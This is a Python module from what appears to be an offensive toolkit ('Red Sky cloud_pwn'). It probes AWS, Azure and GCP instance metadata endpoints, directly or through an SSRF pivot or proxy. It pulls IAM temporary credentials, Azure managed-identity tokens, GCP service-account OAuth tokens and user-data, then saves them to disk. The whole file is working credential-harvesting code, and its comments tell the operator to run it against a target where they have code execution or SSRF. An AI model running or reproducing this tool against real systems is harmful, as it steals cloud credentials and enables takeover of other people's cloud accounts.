# language: Python, file: Program/cloud_pwn/metadata.py, target: Red Sky cloud_pwn — metadata SSRF
# Extracts temporary credentials from the cloud metadata services of the three
# major providers, using the classic SSRF pattern. Use this module on a target
# you have remote code execution or SSRF on:
#   AWS   http://169.254.169.254/latest/meta-data/
#   Azure http://169.254.169.254/metadata/instance?api-version=...
#   GCP   http://metadata.google.internal/computeMetadata/v1/

import json
import sys
import time
from pathlib import Path
from typing import Dict, Optional

import requests

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CLOUD_DIR = OUTPUT_DIR / "cloud_pwn"
UA = "Mozilla/5.0"

AWS_BASE = "http://169.254.169.254/latest"
AZURE_BASE = "http://169.254.169.254/metadata"
GCP_BASE = "http://metadata.google.internal/computeMetadata/v1"


def _get(url: str, headers: Dict = None, timeout: int = 3,
         proxy: str = "", allow_redirects: bool = True) -> Optional[str]:
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = requests.get(url, headers=headers or {}, timeout=timeout,
                         proxies=proxies, allow_redirects=allow_redirects)
        if r.status_code == 200:
            return r.text
    except requests.RequestException:
        return None
    return None


def aws_check(proxy="") -> Dict:
    """Detect AWS metadata. Try IMDSv2 token first, fall back to v1."""
    print_info("checking AWS metadata")
    result = {"provider": "aws", "imdsv2": False, "accessible": False}

    # try IMDSv2 — PUT /latest/api/token with X-aws-ec2-metadata-token-ttl-seconds
    token_url = f"{AWS_BASE}/api/token"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = requests.put(token_url, headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                         timeout=3, proxies=proxies)
        if r.status_code == 200:
            result["imdsv2"] = True
            result["token"] = r.text.strip()
    except requests.RequestException:
        pass

    headers = {}
    if result["imdsv2"]:
        headers["X-aws-ec2-metadata-token"] = result["token"]

    ident = _get(f"{AWS_BASE}/meta-data/instance-id", headers, proxy=proxy)
    if not ident:
        print_warn("AWS metadata not reachable")
        return result

    result["accessible"] = True
    result["instance_id"] = ident.strip()

    for path, key in (
        ("/meta-data/hostname", "hostname"),
        ("/meta-data/local-ipv4", "local_ipv4"),
        ("/meta-data/public-ipv4", "public_ipv4"),
        ("/meta-data/placement/region", "region"),
        ("/meta-data/placement/availability-zone", "az"),
        ("/meta-data/iam/security-credentials/", "iam_role"),
        ("/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", "instance_role"),
        ("/meta-data/network/interfaces/macs/", "macs"),
        ("/meta-data/user-data", "user_data"),
    ):
        v = _get(f"{AWS_BASE}{path}", headers, proxy=proxy)
        if v:
            result[key] = v.strip()

    # pull the actual AWS temporary credentials for the IAM role
    role = result.get("iam_role")
    if role:
        creds_raw = _get(f"{AWS_BASE}/meta-data/iam/security-credentials/{role.strip()}",
                         headers, proxy=proxy)
        if creds_raw:
            try:
                result["credentials"] = json.loads(creds_raw)
                print_ok(f"IAM role: {role.strip()}")
                print_kv("AccessKeyId", result["credentials"].get("AccessKeyId", "")[:20] + "…")
                print_kv("Expiration", result["credentials"].get("Expiration", ""))
            except json.JSONDecodeError:
                result["credentials_raw"] = creds_raw

    return result


def azure_check(proxy="") -> Dict:
    """Detect Azure metadata."""
    print_info("checking Azure metadata")
    result = {"provider": "azure", "accessible": False}
    headers = {"Metadata": "true"}

    instance = _get(f"{AZURE_BASE}/instance?api-version=2021-02-01", headers, proxy=proxy)
    if not instance:
        print_warn("Azure metadata not reachable")
        return result

    try:
        result["instance"] = json.loads(instance)
        result["accessible"] = True
    except json.JSONDecodeError:
        return result

    # azure uses managed identity tokens — request one
    token_url = ("http://169.254.169.254/metadata/identity/oauth2/token"
                 "?api-version=2018-02-01&resource=https://management.azure.com/")
    token_raw = _get(token_url, headers, proxy=proxy, timeout=5)
    if token_raw:
        try:
            result["managed_identity"] = json.loads(token_raw)
            print_ok("Azure managed identity token acquired")
        except json.JSONDecodeError:
            result["managed_identity_raw"] = token_raw
    return result


def gcp_check(proxy="") -> Dict:
    """Detect GCP metadata."""
    print_info("checking GCP metadata")
    result = {"provider": "gcp", "accessible": False}
    headers = {"Metadata-Flavor": "Google"}

    proj = _get(f"{GCP_BASE}/project/project-id", headers, proxy=proxy)
    if not proj:
        print_warn("GCP metadata not reachable")
        return result

    result["project_id"] = proj.strip()
    result["accessible"] = True

    for path, key in (
        ("/instance/name", "instance_name"),
        ("/instance/hostname", "hostname"),
        ("/instance/zone", "zone"),
        ("/instance/service-accounts/", "service_accounts"),
        ("/instance/attributes/", "attributes"),
    ):
        v = _get(f"{GCP_BASE}{path}", headers, proxy=proxy)
        if v:
            result[key] = v.strip()

    # pull an OAuth token from the default service account
    tok = _get(f"{GCP_BASE}/instance/service-accounts/default/token", headers, proxy=proxy, timeout=5)
    if tok:
        try:
            result["access_token"] = json.loads(tok)
            print_ok("GCP default service account token acquired")
        except json.JSONDecodeError:
            pass

    return result


def cmd_scan(providers: str = "all", proxy: str = "") -> int:
    CLOUD_DIR.mkdir(parents=True, exist_ok=True)

    print_info("cloud metadata probe")
    if proxy:
        print_kv("proxy", proxy)
    print()

    results = {}
    if providers in ("all", "aws"):
        results["aws"] = aws_check(proxy)
        print()
    if providers in ("all", "azure"):
        results["azure"] = azure_check(proxy)
        print()
    if providers in ("all", "gcp"):
        results["gcp"] = gcp_check(proxy)
        print()

    hit_any = any(r.get("accessible") for r in results.values())

    print()
    if hit_any:
        print_ok("at least one cloud provider is reachable")
    else:
        print_warn("no cloud metadata reachable — not on a cloud host, or SSRF is blocked")

    out = CLOUD_DIR / f"metadata_{int(time.time())}.json"
    out.write_text(json.dumps(results, indent=2, default=str))
    print_kv("saved", out)
    return 0 if hit_any else 1


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky cloud_pwn metadata", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--providers", default="all", choices=["all", "aws", "azure", "gcp"])
    p.add_argument("--proxy", default="")
    p.add_argument("--url", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky cloud_pwn metadata [--providers aws|azure|gcp|all] [--proxy URL]")
        return 2

    if ns.help:
        print_info("redsky cloud_pwn metadata --providers all --proxy socks5://127.0.0.1:9050")
        print_info("  probes AWS IMDSv1/v2, Azure IMDS, GCP metadata")
        print_info("  use --proxy when running through an SSRF pivot")
        return 0

    return cmd_scan(ns.providers, ns.proxy)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
